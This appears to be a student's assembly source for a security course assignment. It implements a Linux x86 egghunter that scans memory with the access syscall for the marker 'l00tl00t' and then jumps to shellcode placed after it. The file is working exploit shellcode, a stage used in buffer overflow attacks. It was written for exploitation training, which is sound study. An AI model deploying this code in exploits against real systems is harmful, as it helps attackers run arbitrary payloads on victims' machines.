;Title: SLAE/Assignment -3/Egghunter Working Demo 
;SLAE-1122
;Based on : http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf
;access(2) revisited

global _start
section .text
_start:
    
    xor ebx,ebx       ;0
    xor ecx, ecx      ;0
    mul ecx           ;clear eax & edx
	
memory_block:
    or dx, 0xfff      ;Align page address  
	
search:

inc edx               ;Next memory offset
lea ebx,[edx+0x4]     ;Load pointer with 8-bytes egg hunter, we can compare [EDX] & [EDX+4] at same time
push byte 0x21        ;syscall for access(), #define __NR_access 33
pop eax               ;load EAX
int 0x80              ;syscall
cmp al,0xf2           ;Check for EFAULT 
jz memory_block       ;If this not,continue the loop 
mov eax, dword 0x6c303074    ;Store EGG in EAX, here l00t=6c303074  
mov edi,edx           ;Move EDX to EDI for scasd operation  
scasd                 ;Compare EAX[EGG here is l00t] with EDI[????] first 4 bytes  
jnz search            ;It no go back to search
scasd                 ;Compare EAX[EGG here is l00t] with EDI+4[????] second 4 bytes
jnz search            ;It no go back to search
jmp edi               ;We found our Egg! Jump to our shellcode !!!! l00tl00t!!!!  
